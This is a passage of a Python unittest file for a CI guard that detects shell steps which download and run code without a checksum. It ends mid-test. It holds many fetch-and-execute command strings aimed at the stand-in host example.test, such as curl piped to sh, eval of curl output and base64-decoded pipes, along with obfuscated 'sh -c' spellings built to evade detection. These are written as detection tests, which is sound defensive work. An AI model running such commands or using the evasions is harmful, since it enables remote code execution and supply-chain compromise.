        # Review N-3: bash 3.2 and 5.2 run `sh {-c,'…'}` as `sh -c '…'`.
        # Re-review N-C: so is any pattern there that may begin with `-`.
        for script in ("sh {-c,%s}\n", "sudo bash {-c,%s}\n", "sh -o pipefail {-c,%s}\n",
                       "sh [-]c %s\n", "bash -{c,x} %s\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("looks for `-c` or a script", why[0][1] if why else "")
        for script in ("bash lint.sh src/*.py\n", "sh -c 'echo' {a,b}\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))

    def test_a_program_a_shell_is_handed_as_a_glob_binds_a_download(self):
        # Re-review N-C: a pattern that cannot begin with `-` is the program,
        # and runs a download it matches -- `sh ./cuda_*.run` after `curl -o
        # cuda_1.run`, which bash 3.2 and 5.2 run and base read clean for the
        # `./`. The glob binds with a leading `./` dropped and a brace read as
        # `*`, and with a `$` in it by its last part, which r1 reported as a
        # pattern alone; with nothing fetched it runs nothing unchecked.
        get = ("get", "curl -fsSL -o cuda_1.run https://example.test/c\n")
        for use in ("sh ./cuda_*.run --silent", "sudo sh ./cuda_*.run", "bash ./cuda_{1,2}.run",
                    "chmod +x ./cuda_*.run", 'sh "$PWD"/cuda_*.run', "sh $(pwd)/cuda_*.run",
                    "sh ${X}*"):
            with self.subTest(use=use):
                self.assertIn("cuda_1.run", "".join(w for _n, w in wg.job_defects(
                    [get, ("run", use + "\n")])))
        with self.subTest(use="checked, then sh ./cuda_*.run"):
            check = 'echo "%s  cuda_1.run" | sha256sum -c -\n' % ("a" * 64)
            self.assertEqual([], wg.job_defects([get, ("run", check + "sh ./cuda_*.run\n")]))
        for script in ("sh scripts/*.sh\n", "bash [a-c]*.sh\n", "bash -n scripts/*.sh\n",
                       "sudo sh ./cuda_*.run\n", "bash ./build-{a,b}.sh\n", "sh ./configure*\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        with self.subTest(use="a download no glob matches"):
            self.assertEqual([], wg.job_defects([get, ("run", 'sh "$D"/*.sh ./x_*.run\n')]))

    def test_inside_an_expansion_or_arithmetic_there_is_none(self):
        # Review N-1: bash globs nothing written inside `${...}`, `((...))` or
        # `$((...))`, and these idioms were reported from #2294 on.
        for script in ("(( a[1]++ ))\n", "(( count[$k]++ ))\n", "${CMD[@]} --flag\n",
                       "${x#*/} --version\n", "${x%.*}\n", "if (( a[i] > 0 )); then :; fi\n",
                       "$(( a[1] * 2 )) --flag\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        # The must-trips: a pattern beside or inside them, where bash globs it.
        for script in ("${x}[s]h -c %s\n", "(( a[1]++ )) && [s]h -c %s\n",
                       "((echo) ; [s]h -c %s)\n", "(( $([s]h -c %s) ))\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("is a pattern", why[0][1] if why else "")

    def test_in_a_conditional_an_array_or_an_extglob_group_there_is_none(self):
        # Re-review I-5: 16 jobs in 10 calibration-pool repos, 14 of them
        # fetching nothing, failed on #2294's rule, where the reader put these
        # words where a command starts. Bash runs none of them: a conditional
        # expands no pattern, an array literal globs its words into the array,
        # and an extglob group is part of its word (`shopt -s extglob`).
        for script in ("results=(files/x/*)\n", "blockmaps=(static/dist/*.blockmap)\n",
                       "A=(${DIR}/*)\n", "arr=(*.txt)\n",
                       "files=(\n  dist/*.dmg\n  dist/*.exe\n)\n", "files+=(\n  **/*.sh\n)\n",
                       "declare -A t=(\n  [n8n]=${V}\n)\n",
                       "f() {\n  local -a x=( *.sh )\n}\n",
                       "if [[ $v =~ ^2\\.(0|[1-9]*)$ ]]; then :; fi\n",
                       "[[ $d =~ ME([[:space:]]|(\\\\[rn]))+ ]]\n",
                       "case 1.2 in\n  +([0-9]).+([0-9]) ) echo ok ;;\nesac\n",
                       "for f in @(*.deb|*.zip); do echo \"$f\"; done\n",
                       "rm -rf !(keep|*.md)\n", "x=@(a|b)\n"):
            with self.subTest(script=script):
                self.assertEqual([], wg.job_defects([("step", script)]))
        # The must-trips: a pattern where a command starts, beside them or in a
        # substitution inside them; an extglob group that is the command or
        # stands where `sh` looks for `-c`, which bash with `extglob` on expands
        # (`@(sh)` to `sh`, given a file `sh`; `!(x)` too, which with it off
        # negates a subshell); a case arm's `[[)`, a pattern and no conditional;
        # and an array's `[` no `]` closes, which bash 3.2 reads on past as code.
        for script in ("( [s]h -c %s )\n", "{sh,-c} %s\n", "[s]h -c %s\n",
                       "arr=(*.txt); [s]h -c %s\n", "files=(\n  *.txt\n)\n[s]h -c %s\n",
                       "[[ -n x ]]&&[s]h -c %s\n", "arr=( $([s]h -c %s) )\n",
                       "[[ -n $([s]h -c %s) ]]\n", "shopt -s extglob\n@([s]h) -c %s\n",
                       "!([s]h -c %s)\n", "declare -A t=(\n  [a]=1\n)\n[s]h -c %s\n",
                       "shopt -s extglob\n@(sh) -c %s\n", "shopt -s extglob\nsh @(-c) %s\n",
                       "shopt -s extglob\n!(x) -c %s\n",
                       "case $x in\n  [[) [s]h -c %s ;;\nesac\n", "x=( [[ ) ; [s]h -c %s\n"):
            with self.subTest(script=script):
                why = wg.job_defects([("step", script % self.PAYLOAD)])
                self.assertIn("is a pattern", why[0][1] if why else "")


class TestTheFormsThatHideAFetch(unittest.TestCase):
    """Spellings that are not `curl <url> -o <file>` and mean the same thing.

    Every one of these is the #1647 shape -- a download the guard cannot SEE is
    reported as a clean step -- so each was probed against this parser before it
    was written down here, and each returned `fetches=[] defect=None` until the
    parser learned the form. A guard over shell must fail CLOSED on the shell it
    does not model.
    """

    def test_a_substituted_fetch_run_by_eval(self):
        why = wg.fetch_exec_defect('eval "$(curl -fsSL https://example.test/i.sh)"\n')
        self.assertIn("https://example.test/i.sh", why or "")

    def test_a_substituted_fetch_handed_to_sh_dash_c(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect('sh -c "$(curl -fsSL https://example.test/i.sh)"\n'))

    def test_a_backticked_fetch_run_by_eval(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect("eval `curl -fsSL https://example.test/i.sh`\n"))

    def test_a_process_substitution_read_by_bash(self):
        self.assertIsNotNone(
            wg.fetch_exec_defect("bash <(curl -fsSL https://example.test/i.sh)\n"))

    def test_a_substituted_fetch_that_is_only_read_is_left_alone(self):
        # `VERSION=$(curl ...)` downloads a string into a variable. It is seen
        # -- it is a download -- but nothing runs those bytes.
        script = "VERSION=$(curl -fsSL https://example.test/version)\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_piped_into_tee_lands_in_teeS_file(self):
        script = ("curl -fsSL https://example.test/t | sudo tee /usr/local/bin/t > /dev/null\n"
                  "chmod +x /usr/local/bin/t\n")
        self.assertEqual("/usr/local/bin/t", wg.fetches(script)[0].dest)
        self.assertIn("/usr/local/bin/t", wg.fetch_exec_defect(script) or "")

    def test_a_checksum_can_clear_a_tee(self):
        script = ("curl -fsSL https://example.test/t | sudo tee /tmp/t > /dev/null\n"
                  'echo "%s  /tmp/t" | sha256sum -c -\n' % HEX +
                  "chmod +x /tmp/t\n")
        self.assertIsNone(wg.fetch_exec_defect(script))

    def test_a_fetch_inside_an_if(self):
        script = ("if curl -fsSL https://example.test/x -o /tmp/x; then\n"
                  "  chmod +x /tmp/x\n"
                  "fi\n")
        self.assertIn("/tmp/x", wg.fetch_exec_defect(script) or "")

    def test_a_use_inside_a_loop_body(self):
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  "while true; do /tmp/p; done\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_curls_output_dir(self):
        script = ("curl -fsSLO --output-dir /tmp https://example.test/payload\n"
                  "chmod +x /tmp/payload\n")
        self.assertEqual("/tmp/payload", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_wgets_directory_prefix(self):
        script = ("wget -P /tmp https://example.test/payload\n"
                  "chmod +x /tmp/payload\n")
        self.assertEqual("/tmp/payload", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_process_substitution_in_a_redirect(self):
        # M4: `bash < <(curl ...)` is the #1647 signature with one more layer:
        # the redirect target was discarded before substitutions were read, so
        # the fetch was not seen AT ALL.
        script = "bash < <(curl -fsSL https://example.test/i.sh)\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_substitution_inside_an_unquoted_heredoc_body(self):
        # L5: `<<EOF` expands; `<<'EOF'` does not. The body of the expanding
        # one is shell, and a fetch in it reaches the interpreter reading it.
        script = "bash <<EOF\n$(curl -fsSL https://example.test/i.sh)\nEOF\n"
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_quoted_heredoc_body_is_literal_text(self):
        script = "cat <<'EOF' > /tmp/note\n$(curl -fsSL https://example.test/i.sh)\nEOF\n"
        self.assertEqual([], wg.fetches(script))

    def test_a_fetch_inside_a_function_body(self):
        # M1: `f() { ... }` is where a long step keeps its download, and the
        # function name stood where the command was expected.
        for opener in ("f() {", "f () {", "function f {"):
            script = (opener + " curl -fsSL https://example.test/x -o /tmp/x; }\n"
                      "f\nchmod +x /tmp/x\n")
            self.assertEqual(1, len(wg.fetches(script)), opener)
            self.assertIsNotNone(wg.fetch_exec_defect(script), opener)

    def test_a_fetch_inside_a_subshell(self):
        script = ("( curl -fsSL https://example.test/x -o /tmp/x )\n"
                  "chmod +x /tmp/x\n")
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_download_with_no_parseable_url_is_reported_not_dropped(self):
        # L2: `wget -i list.txt` downloads a LIST of URLs to names this guard
        # cannot know. Unparsed is not clean; say so.
        why = wg.fetch_exec_defect("wget -i list.txt\n")
        self.assertIsNotNone(why)
        self.assertIn("wget", why)

    def test_asking_curl_its_version_is_not_a_download(self):
        for script in ("curl --version\n", "wget --help\n", "curl -V\n"):
            self.assertEqual([], wg.fetches(script), script)
            self.assertIsNone(wg.fetch_exec_defect(script), script)

    def test_a_substitution_carrying_a_heredoc_marker_does_not_crash(self):
        # #1697 review F7: the OUTER parse lifts the heredoc body and leaves
        # `@@heredoc0@@` inside the substitution's text; re-reading that text
        # is a second parse whose tables are empty. A guard that raises
        # reports nothing at all, which is worse than reporting a gap.
        for script in ('eval "$(cat <<\'EOF\'\n'
                       "curl -sfL https://example.test/p -o /tmp/p\n"
                       "chmod +x /tmp/p\n"
                       'EOF\n)"\n',
                       'sh -c "$(cat <<\'EOF\'\nhello\nEOF\n)"\n',
                       'X="$(cat <<\'EOF\'\nhello\nEOF\n)"\n'):
            wg.fetch_exec_defect(script)        # must not raise
            wg.fetches(script)

    def test_a_shifted_left_string_is_not_a_heredoc(self):
        # `<<` inside a quoted string has no terminator line; reading it as a
        # heredoc swallows the rest of the step, and every statement after it
        # disappears from the guard.
        script = ('echo "shift << 2"\n'
                  "curl -fsSL https://example.test/p | sh\n")
        self.assertEqual(1, len(wg.fetches(script)))
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_destination_carried_in_a_variable(self):
        # `TMP=$(mktemp)` is how a careful step names its download, and the
        # guard follows the NAME the shell uses, not a resolved path.
        script = ('TMP="$(mktemp)"\n'
                  'curl -fsSL https://example.test/p -o "$TMP"\n'
                  'chmod +x "$TMP"\n')
        self.assertEqual("$TMP", wg.fetches(script)[0].dest)
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_an_md5_check_is_not_a_sha256_check(self):
        # `-c` on a weaker digest tool is a check of something, but not of what
        # this rule is about; the old regex read `sha256sum|shasum` and this
        # one reads a list, so the list is what gets asserted.
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  'echo "%s  /tmp/p" | md5sum -c -\n' % ("a" * 32) +
                  "chmod +x /tmp/p\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))

    def test_a_numeric_chmod_that_sets_any_execute_bit(self):
        script = ("curl -fsSL https://example.test/p -o /tmp/p\n"
                  "chmod 750 /tmp/p\n")
        self.assertIsNotNone(wg.fetch_exec_defect(script))


class TestTheHadolintStep(unittest.TestCase):
    """The real step this rule was written for, in both answers (carried over
    from `tests/test_workflow_pins.py`'s TestFetchExecRule)."""

    HADOLINT = ("curl -sfL --connect-timeout 5 --max-time 60 --retry 3 \\\n"
                "  -o /tmp/hadolint \\\n"
                "  https://example.test/hadolint-Linux-x86_64\n"
                "chmod +x /tmp/hadolint\n"
                "sudo mv /tmp/hadolint /usr/local/bin/hadolint\n")

    def test_the_unverified_fetch_and_exec_is_a_defect(self):
        self.assertIn("/tmp/hadolint", wg.fetch_exec_defect(self.HADOLINT))

    def test_a_checksum_clears_it(self):
        verified = self.HADOLINT.replace(
            "chmod +x", 'echo "$SHA  /tmp/hadolint" | sha256sum -c -\nchmod +x')
        self.assertIsNone(wg.fetch_exec_defect(verified))

    def test_a_checksum_after_the_chmod_is_still_a_defect(self):
        late = self.HADOLINT.replace(
            "sudo mv", 'echo "$SHA  /tmp/hadolint" | sha256sum -c -\nsudo mv')
        self.assertIn("only AFTER", wg.fetch_exec_defect(late))

    def test_an_interpreter_invocation_counts_as_executing(self):
        script = ("curl -sfL https://example.test/i.py -o /tmp/i.py\n"
                  "python3 /tmp/i.py\n")
        self.assertIn("/tmp/i.py", wg.fetch_exec_defect(script))


class TestASwallowedCheckIsNotACheck(unittest.TestCase):
    """M2: a checksum whose non-zero exit nobody sees verified nothing.

    Runners default to `bash -e`, which is what makes `sha256sum -c` a GATE:
    the job stops. Put the check on the left of `||`, in the background, or
    under a negation and the step sails past a mismatch -- while the guard,
    reading only the command name, called it verified.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    EXEC = "chmod +x /tmp/payload\n"

    def swallowed(self, check):
        return wg.fetch_exec_defect(self.FETCH + check + self.EXEC)

    def test_or_true(self):
        self.assertIsNotNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c - || true\n' % HEX))

    def test_or_a_warning_annotation(self):
        # nvd-cache.yml uses exactly this idiom for a DIFFERENT command; the
        # point is that the guard must read the separator, not the intent.
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" | sha256sum -c - '
            '|| echo "::warning::checksum mismatch"\n' % HEX))

    def test_backgrounded(self):
        self.assertIsNotNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c - &\n' % HEX))

    def test_under_a_negation(self):
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
            "if ! sha256sum -c /tmp/sums; then echo mismatch; fi\n"))

    def test_under_an_if_condition(self):
        # M3: errexit never applies to an `if` CONDITION, so the step sails
        # past a mismatch exactly as it does with `|| true` -- the unsafe
        # mirror of the `if !` form above.
        self.assertIsNotNone(self.swallowed(
            'echo "%s  /tmp/payload" > /tmp/sums\n' % HEX +
            "if sha256sum -c /tmp/sums; then echo ok; fi\n"))

    def test_or_exit_is_a_gate_not_a_swallow(self):
        # L1: `|| exit 1` ends the job, which is what errexit would have done.
        # It is the cheap hardened spelling, so it must not be refused.
        for branch in ("|| exit 1", "|| exit 2", "|| { echo bad; exit 1; }",
                       "|| { echo '::error::mismatch'; exit 1; }", "|| false"):
            self.assertIsNone(self.swallowed(
                'echo "%s  /tmp/payload" | sha256sum -c - %s\n' % (HEX, branch)),
                branch)

    def test_an_if_test_whose_check_is_the_second_pipeline_stage(self):
        # #1697 item 2, and the FIRST one the issue asks for: the `if` sits on
        # the pipeline HEAD (`echo`), so asking the checksum's own stage
        # whether it is a test answers no -- and this is the spelling the
        # guard's own remedy text recommends, so it is the one an author is
        # most likely to wrap.
        self.assertIsNotNone(self.swallowed(
            'if echo "%s  /tmp/payload" | sha256sum -c -; then :; fi\n' % HEX))

    def test_a_negation_on_the_pipeline_head(self):
        self.assertIsNotNone(self.swallowed(
            '! echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX))

    def test_a_while_test_whose_check_is_the_second_pipeline_stage(self):
        self.assertIsNotNone(self.swallowed(
            'while echo "%s  /tmp/payload" | sha256sum -c -; do break; done\n'
            % HEX))

    def test_a_plain_check_still_counts(self):
        self.assertIsNone(
            self.swallowed('echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX))

    def test_a_check_joined_with_and_still_counts(self):
        self.assertIsNone(self.swallowed(
            'echo "%s  /tmp/payload" | sha256sum -c - && echo verified\n' % HEX))


class TestACheckInsideAScriptMustStopTheStep(unittest.TestCase):
    """Review I-2 of the #1793 follow-ups: a checksum inside a script handed to
    `sh -c`, to a shell's standard input (a quoted heredoc, and since #2293 a
    here-string) or to `eval` was credited as if the step's own shell ran it.
    A child shell has no `-e` unless it is given one, and exits with its last
    command's status: bash 3.2 and 5.2 run `./tool` with the checksum failing
    after `sh -c 'CHECK; echo ok'` and after `sh -c 'CHECK' || true`. Such a
    checksum now clears a use only where its failure stops the step: it stops
    the script (`-e` holds there, or it is the script's last command, the last
    of its pipeline) and the command handing the script over does not swallow
    that. `eval` runs in the step's own shell, so its script keeps the step's
    `-e` -- except where bash suspends it, behind `||`/`&&`, `!` or `if`."""

    FETCH = "curl -fsSL -o tool https://example.test/tool\n"
    CHECK = 'echo "%s  tool" | sha256sum -c -' % HEX

    def job(self, form, check=CHECK):
        return wg.job_defects([("step", self.FETCH + form % check + "\n./tool\n")])

    def assertReported(self, form, why, check=CHECK):
        found = self.job(form, check)
        self.assertEqual(1, len(found), found)
        self.assertIn("the checksum that names tool is inside the script", found[0][1])
        self.assertIn(why, found[0][1])

    def test_a_check_the_script_carries_on_past_is_reported(self):
        for form in ("sh -c '%s; echo ok'", "sh <<< '%s; echo ok'",
                     "sh <<'EOF'\n%s\necho ok\nEOF", "sh -c 'set -e; set +e; %s; echo ok'",
                     "eval '%s; echo ok' || exit 1"):
            with self.subTest(form=form):
                self.assertReported(form, "carries on past its failure")
        self.assertReported('sh -c "sh -c \'%s\'; echo ok"', "the step does not stop",
                            self.CHECK.replace('"', '\\"'))

    def test_a_check_piped_into_another_command_in_the_script_is_reported(self):
        for form in ("sh -c '%s | cat'", "sh -ec '%s | cat; echo ok'"):
            with self.subTest(form=form):
                self.assertReported(form, "piped into a command whose status the pipeline takes")

    def test_a_script_whose_failure_the_step_goes_on_past_is_reported(self):
        for form in ("sh -c '%s' || true", "sh <<< '%s' || true",
                     "sh -ec '%s; echo ok' || true", "if sh -c '%s'; then :; fi",
                     "! sh -c '%s'", "eval '%s; echo ok' || true", "eval '%s' || true"):
            with self.subTest(form=form):
                self.assertReported(form, "the step does not stop when that script fails")

    def test_a_check_that_stops_the_script_and_the_step_still_clears(self):
        for form in ("sh -c '%s'", "sh <<< '%s'", "sh <<'EOF'\n%s\nEOF",
                     "sh -ec '%s; echo ok'", "sh -e -c '%s; echo ok'",
                     "bash -euo pipefail -c '%s; echo ok'", "sh <<< 'set -e; %s; echo ok'",
                     "sh -c 'set -o errexit; %s; echo ok'",
                     "bash -e <<'EOF'\n%s\necho ok\nEOF", "eval '%s; echo ok'",
                     "eval '%s' || exit 1", "sh -c '%s' || exit 1"):
            with self.subTest(form=form):
                self.assertEqual([], self.job(form))
        self.assertEqual([], self.job('sh -c "sh -c \'%s\'"', self.CHECK.replace('"', '\\"')))

    def test_the_top_level_twins_read_as_before(self):
        # The must-trip controls: the step's own `CHECK || true` is reported
        # on every tree, and its own `CHECK` clears.
        self.assertIn("hands its failure to a `||` branch", self.job("%s || true")[0][1])
        self.assertEqual([], self.job("%s"))

    def test_an_exit_behind_the_check_in_a_script_without_e_is_not_read(self):
        # Fail-closed, and the rule's one known over-report: bash stops this
        # script at `exit 1`, but only `-e` or the script's last command are
        # read as stopping it.
        self.assertReported("sh -c '%s || exit 1; echo ok'", "carries on past its failure")


class TestChecksumRescueStatus(unittest.TestCase):
    FETCH = "curl -fsSL https://example.test/payload -o payload\n"
    USE = "sh payload\n"

    def checked(self, rescue):
        return wg.fetch_exec_defect(
            self.FETCH + 'echo "%s  payload" | sha256sum -c - || %s\n'
            % (HEX, rescue) + self.USE)

    def test_success_and_unknown_exit_statuses_do_not_certify_failure(self):
        for rescue in ("exit 0", "return 0", "exit 256", "return 256",
                       "exit $STATUS", "return $STATUS", "exit nope",
                       "return nope"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))

    def test_group_uses_its_last_status(self):
        for rescue in ("{ false; echo recovered; }",
                       "{ false; true; }", "{ false; exit 0; }",
                       "{ false; return 256; }", "{ true; exit; }",
                       "{ echo recovered; exit $?; }", "(false; true)",
                       "((false; true))", "(false; (false; true))",
                       "false || true", "(false) || true",
                       "{ false; } || true", "(exit 1) || true",
                       "((exit 1); echo recovered)",
                       "{ if true; then false; else true; fi; }"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))

    def test_and_or_tail_can_rescue_failed_handlers(self):
        for rescue in ("false", "(false)", "{ false; }", "(exit 1)"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue + " && true || true"))
        self.assertIsNone(self.checked("exit 1 && true || true"))
        self.assertIsNone(self.checked("{ exit 1; } && true || true"))

    def test_known_nonzero_rescues_remain_gates(self):
        for rescue in ("exit 1", "return 2", "exit 257", "false", "exit",
                       "return", "exit $?", "return $?",
                       "{ echo mismatch; exit 1; }", "{ echo mismatch; false; }",
                       "{ false; exit; }", "(echo mismatch; false)",
                       "((echo mismatch; false))", "(false; (true; false))",
                       "(exit 1; echo unreachable)", "exit 1 || true",
                       "{ exit 1; } || true"):
            with self.subTest(rescue=rescue):
                self.assertIsNone(self.checked(rescue))

    def test_negated_detached_and_pipeline_rescues_are_not_gates(self):
        for rescue in ("! false", "exit 1 | true || true", "{ false; } &",
                       "exit 1 &", "{ exit 1; } &"):
            with self.subTest(rescue=rescue):
                self.assertIsNotNone(self.checked(rescue))


class TestPipelineStreamProvenance(unittest.TestCase):
    URL = "https://example.test/install"

    def test_stdout_aliases_follow_ordered_pipeline_provenance(self):
        for script in ("curl -fsSL %s >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s >/dev/fd/1 | sh" % self.URL,
                       "curl -fsSL %s 3>&1 >/dev/null >&3 | sh" % self.URL,
                       "curl -fsSL %s | cat >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s | cat 3>&1 >/dev/null >&3 | sh" % self.URL,
                       "curl -fsSL %s | tee install.sh >/dev/fd/1 | sh" % self.URL):
            with self.subTest(script=script):
                self.assertTrue(wg.fetch_exec_defects(script))
        for script in ("curl -fsSL %s >/dev/stdout >saved | sh" % self.URL,
                       "curl -fsSL %s >/dev/null >/dev/stdout | sh" % self.URL,
                       "curl -fsSL %s | cat >saved >/dev/fd/1 | sh" % self.URL,
                       "curl -fsSL %s -o saved >/dev/stdout | sh" % self.URL):
            with self.subTest(script=script):
                self.assertFalse(wg.fetch_exec_defects(script))
        self.assertEqual("saved", wg.fetches(
            "curl -fsSL %s >saved >/dev/stdout | sh" % self.URL)[0].dest)

    def test_stdin_aliases_and_saved_descriptors(self):
        for suffix in ("cat /dev/stdin | sh", "cat /dev/fd/0 | sh",
                       "sed s/x/x/ /dev/stdin | sh", "cat </dev/stdin | sh",
                       "cat </dev/fd/0 | sh", "sh </dev/stdin", "sh </dev/fd/0",
                       "sh 3<&0 <local </dev/fd/3",
                       "cat 3<&0 <local </dev/fd/3 | sh",
                       "cat 3<&0 <local /dev/fd/3 | sh",
                       "sed s/x/x/ 3<&0 <local /dev/fd/3 | sh",
                       "sed s/x/x/ local /dev/stdin | sh",
                       "cat /dev/./stdin | sh", "cat /dev/fd/$FD | sh",
                       "cat /proc/self/fd/0 | sh", "sh </dev/fd/$FD",
                       "cat <local $INPUT | sh"):
            with self.subTest(suffix=suffix):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))
        for suffix in ("sh <local </dev/stdin", "sh </dev/stdin <local",
                       "cat <local /dev/stdin | sh",
                       "cat 3<local /dev/fd/3 | sh",
                       "sed s/x/x/ <local /dev/fd/0 | sh"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))

    def test_custom_filter_forwarding_and_disconnection(self):
        prefix = "curl -fsSL %s | ./custom-filter --mode decode" % self.URL
        self.assertTrue(wg.fetch_exec_defects(prefix + " | sh"))
        for suffix in ("", " <local | sh", " >saved | sh"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(prefix + suffix))

    def test_forwarding_stages_reach_executors(self):
        for stages in ("cat | sh", "cat saved - | sh", "tee install.sh | sh",
                       "tr a-z A-Z | bash", "sed s/a/b/ | python3 -",
                       "cat | tee install.sh | bash", "head -c 1024 | sh",
                       "base64 -d | sh"):
            with self.subTest(stages=stages):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, stages)))

    def test_read_only_and_disconnected_streams(self):
        for script in ("curl -fsSL %s | cat" % self.URL,
                       "curl -fsSL %s | head -c 1024" % self.URL,
                       "curl -fsSL %s | cat > saved | sh" % self.URL,
                       "curl -fsSL %s | head -c 10 < local | sh" % self.URL,
                       "curl -fsSL %s | head -c 10 > saved | sh" % self.URL,
                       "curl -fsSL %s | cat saved | sh" % self.URL,
                       "curl -fsSL %s | sed s/a/b/ saved | sh" % self.URL,
                       "curl -fsSL %s | cat | sh < local" % self.URL,
                       "curl -fsSL %s -o saved | cat | sh" % self.URL,
                       "curl -fsSL %s -o /dev/null | cat | sh" % self.URL,
                       "curl -fsSL %s > saved | cat | sh" % self.URL):
            with self.subTest(script=script):
                self.assertFalse(wg.fetch_exec_defects(script))

    def test_tee_still_names_the_file_it_writes(self):
        script = "curl -fsSL %s | tee install.sh | sh" % self.URL
        self.assertEqual("install.sh", wg.fetches(script)[0].dest)
        self.assertTrue(wg.fetch_exec_defects(script))

    def test_wget_stdout_and_tee_without_executor(self):
        self.assertTrue(wg.fetch_exec_defects(
            "wget -qO- %s | cat | sh" % self.URL))
        self.assertFalse(wg.fetch_exec_defects(
            "curl -fsSL %s | tee install.sh" % self.URL))

    def test_pipeline_inside_a_substitution_is_still_executed(self):
        self.assertTrue(wg.fetch_exec_defects(
            'echo "$(curl -fsSL %s | cat | sh)"' % self.URL))

    def test_only_final_descriptor_zero_provenance_disconnects_the_pipe(self):
        for suffix in ("cat 3<local | sh", "cat | sh 3<local",
                       "sh 3<local", "sh 3<<EOF\necho safe\nEOF",
                       "cat 3<&0 0<local 0<&3 | sh",
                       "cat 3<&0 <<EOF 0<&3 | sh\necho safe\nEOF",
                       "cat | sh 3<&0 <<EOF 0<&3\necho safe\nEOF",
                       "cat | sh 3<<EOF\necho safe\nEOF"):
            with self.subTest(suffix=suffix):
                self.assertTrue(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))
        # The delimiter is QUOTED wherever the body is what `sh` runs: an
        # EXPANDING script on an interpreter's stdin is reported unread in its
        # own right (#1839, and `TestTheGapsTheGuardDocuments`), which is a
        # different claim from the one under test here -- that the download
        # these steps pipe is not what the interpreter reads.
        for suffix in ("cat | sh <<'EOF'\necho safe\nEOF",
                       "sh <<'EOF'\necho safe\nEOF", "sh <local",
                       "cat 3<&0 0<local | sh",
                       "cat 0<&3 3<&0 | sh",
                       "cat 3<&0 0<&3 <<EOF | sh\necho safe\nEOF",
                       "cat | sh 3<&0 0<&3 <<'EOF'\necho safe\nEOF"):
            with self.subTest(suffix=suffix):
                self.assertFalse(wg.fetch_exec_defects(
                    "curl -fsSL %s | %s" % (self.URL, suffix)))


class TestTheMessageSaysWhatWasChecked(unittest.TestCase):
    """#1697: one sentence was doing four jobs.

    "the step's checksum does not name X" was printed whenever no checksum
    CLEARED the fetch -- including when one named it exactly and was refused
    for a different reason (swallowed, soft, under another `if:`). The author
    reading it goes looking for a naming bug in a line that names the file
    correctly, and the control's real objection never reaches them. And the
    scope has been the JOB since M5, so "the step's" was wrong twice over.
    """

    FETCH = "curl -sfL https://example.test/payload -o /tmp/payload\n"
    CHECK = 'echo "%s  /tmp/payload" | sha256sum -c -\n' % HEX
    EXEC = "chmod +x /tmp/payload\n"

    def why(self, *steps):
        found = wg.job_defects(list(steps))
        self.assertEqual(1, len(found), found)
        return found[0][1]

    def test_no_checksum_in_the_job_names_it(self):
        why = self.why(("get", self.FETCH),
                       ("check", 'echo "%s  /tmp/other" | sha256sum -c -\n'
                                 % OTHER_HEX),
                       ("run", self.EXEC))
        self.assertIn("no checksum in the job names", why)

    def test_a_checksum_that_names_it_and_was_swallowed(self):
        why = self.why(("get", self.FETCH),
                       ("check", self.CHECK.rstrip("\n") + " || true\n"),
                       ("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("`||` branch", why)
        self.assertNotIn("does not name", why)

    def test_a_checksum_that_names_it_and_carries_no_digest(self):
        # `$FILE` is an expansion, not an expectation: the checked text names
        # the download and says nothing about what should have arrived.
        why = self.why(("get", self.FETCH),
                       ("check", 'echo "$FILE  /tmp/payload" | sha256sum -c -\n'),
                       ("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("no digest", why)

    def test_a_checksum_that_names_it_under_another_condition(self):
        why = self.why(wg.Step("get", self.FETCH),
                       wg.Step("check", self.CHECK, None, "github.ref == 'main'"),
                       wg.Step("run", self.EXEC))
        self.assertIn("the checksum that names", why)
        self.assertIn("`if:`", why)

    def test_a_checksum_that_names_it_in_a_soft_step(self):
